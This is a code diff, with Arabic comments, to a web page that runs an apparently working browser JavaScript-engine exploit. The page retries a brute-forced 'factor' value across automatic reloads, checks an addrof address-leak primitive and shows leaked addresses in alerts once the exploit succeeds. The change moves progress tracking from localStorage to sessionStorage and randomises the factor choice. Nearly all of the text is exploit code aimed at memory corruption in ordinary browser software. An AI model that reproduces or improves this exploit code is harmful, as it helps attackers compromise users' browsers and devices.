@@ -81,8 +81,7 @@
         }
 
         function resetProgress() {
-            localStorage.removeItem('triedFactors');
-            localStorage.removeItem('factorIndex');
+            sessionStorage.removeItem('triedFactors'); // استخدام sessionStorage بدلاً من localStorage
             document.getElementById("status").innerHTML = "Progress reset, reloading...";
             setTimeout(() => location.reload(), 1000);
         }
@@ -96,23 +95,25 @@
                 success = true;
             }
             if (!success) {
-                document.getElementById("status").innerHTML = "Exploit failed with factor = [last tried factor not tracked here]. Trying again...";
+                document.getElementById("status").innerHTML = "Exploit failed.. Trying again!";
                 setTimeout(() => location.reload(), 1000); // إعادة تحميل تلقائي
                 return;
             }
 
             let symbolObject = Object(getterSetter);
 
-            // قائمة القيم
+            // قائمة القيم غير المتكررة مؤقتة (في جلسة واحدة)
             let allFactors = Array.from({ length: 1001 }, (_, i) => 87 + i);
-            let triedFactors = JSON.parse(localStorage.getItem('triedFactors')) || [];
+            let triedFactors = JSON.parse(sessionStorage.getItem('triedFactors')) || [];
             let availableFactors = allFactors.filter(f => !triedFactors.includes(f));
-            let index = localStorage.getItem('factorIndex') ? parseInt(localStorage.getItem('factorIndex')) : 0;
-            let factor = availableFactors[index] || allFactors[0]; // إذا نفدت القيم، ابدأ من الأول
-
-            if (!factor) {
-                document.getElementById("status").innerHTML = "All factors tried, reset required!";
-                return;
+            let factor;
+            if (availableFactors.length > 0) {
+                let randomIndex = Math.floor(Math.random() * availableFactors.length);
+                factor = availableFactors[randomIndex];
+                triedFactors.push(factor);
+                sessionStorage.setItem('triedFactors', JSON.stringify(triedFactors));
+            } else {
+                factor = 87 + Math.floor(Math.random() * 1000); // إذا نفدت القيم، عودة إلى عشوائي
             }
 
             // طباعة القيمة المجربة
@@ -138,10 +139,7 @@
 
             let sample = BigInt(addrof({}).toString());
             if (sample >= 0x200000000 || sample < 0x100000000) {
-                triedFactors.push(factor);
-                localStorage.setItem('triedFactors', JSON.stringify(triedFactors));
-                localStorage.setItem('factorIndex', index + 1);
-                document.getElementById("status").innerHTML = "Failed with factor = " + factor + ". Trying next factor...";
+                document.getElementById("status").innerHTML = "Failed with factor = " + factor + ". Trying again...";
                 setTimeout(() => location.reload(), 1000); // إعادة تحميل تلقائي
                 return;
             } else {
@@ -151,8 +149,7 @@
                 alert(addrof({}).toString());
                 alert(addrof({}).toString());
                 alert(addrof({}).toString());
-                localStorage.removeItem('triedFactors');
-                localStorage.removeItem('factorIndex');
+                sessionStorage.removeItem('triedFactors'); // إعادة تعيين بعد النجاح
             }
         })();
     </script>
